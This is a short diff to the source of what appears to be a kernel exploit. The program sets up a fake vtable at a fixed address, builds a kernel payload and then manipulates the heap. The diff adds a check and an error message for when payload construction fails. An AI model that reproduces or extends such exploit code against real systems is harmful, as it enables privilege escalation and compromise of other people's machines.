@@ -118,8 +118,11 @@ int main(int argc, const char * argv[]) {
     void** vtable = alloc((void*)0x1337100000, 0x1000);
     payload[0] = (uint64_t)vtable;
     
-    lsym_payload((uint64_t*)&vtable[0], (uint64_t*)&vtable[4], LSYM_PAYLOAD_VTABLE, (void*)kernel_payload);
-    
+    if(!lsym_payload((uint64_t*)&vtable[0], (uint64_t*)&vtable[4], LSYM_PAYLOAD_VTABLE, (void*)kernel_payload))
+    {
+	printf("[-] Could not build the payload.\n");
+	exit(1);
+    }
     printf("[+] Payload successfully crafted.\n");
     printf("[i] Manipulating the heap...\n");
     
